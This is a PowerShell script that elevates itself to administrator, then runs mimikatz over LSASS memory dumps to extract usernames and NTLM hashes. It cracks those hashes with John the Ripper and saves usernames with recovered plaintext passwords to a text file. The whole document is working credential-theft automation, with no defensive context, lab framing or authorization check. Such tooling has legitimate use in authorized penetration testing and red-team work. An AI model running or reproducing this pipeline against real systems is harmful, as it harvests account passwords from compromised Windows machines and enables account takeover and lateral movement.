# The script fails if not running as Administrator.
# Re-run the script with elevated permissions and continue.
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
	if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
		Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList "-File `"$PSCommandPath`""
		Exit
	}
}

# This ensures the script's working directory is the same as the script location
cd $PSScriptRoot

# Set variables for file names
# This assumes the script is being run in the parent folder of mimikatz and john the ripper respectively
$Mimikatz = "$PWD\mimikatz_trunk\x64\mimikatz.exe"
$John = "$PWD\john-1.9.0-jumbo-1-win64\run\john.exe"
$HashFile = "$PWD\ntlms.txt"
$PassFile = "$PWD\cracked-passwords.txt"

# Create a list to store all user data
$Users = New-Object System.Collections.ArrayList

# Delete any existing hash file to ensure we only crack the new hashes
If (Test-Path $HashFile) {
	Remove-Item $HashFile
}

ForEach ($DMP in Get-ChildItem -Path *.DMP -Recurse) {
	$file = $DMP.FullName
	
	# Use mimikatz to read the dumped LSASS files
	$output = & "$Mimikatz" "sekurlsa::minidump \""$file\""" sekurlsa::logonPasswords exit
	$user = (($output | Select-String '\* (Username)' | Select -First 1) -Split ':')[1].Trim()
	$ntlm = (($output | Select-String '\* (NTLM)' | Select -First 1) -Split ':')[1].Trim()
	
	# A custom object is used to store the user data for output formatting
	# Assign a default password until it's cracked by John the Ripper
	$UserData = [PSCustomObject]@{Username = $user; NTLM = $ntlm; Password = "N/A"}
	$Users.Add($UserData) | Out-Null
	
	Add-Content $HashFile $ntlm
}

# Crack the list of NTLM hashes using John the Ripper
& "$John" --format=NT "$HashFile"

ForEach ($POT in Get-ChildItem -Path john.pot -Recurse) {
	$file = $POT.FullName
	
	# Read through each line of the cracked hashes
	Get-Content -Path "$file" | ForEach-Object {
		# Split the line to grab the NTLM hash and password
		$line = ($_ -replace '.*\$' -Split ':')
		$ntlm = $line[0]
		$pass = $line[1]
		
		ForEach ($user in $Users) {
			# When a cracked hash matches a user hash, assign the password and move onto the next hash
			If ($user.NTLM -eq $ntlm) {
				$user.Password = $pass
				break
			}
		}
	}
}

Write-Host
Write-Host "Writing password info to: $PassFile"

$Users | Out-File $PassFile
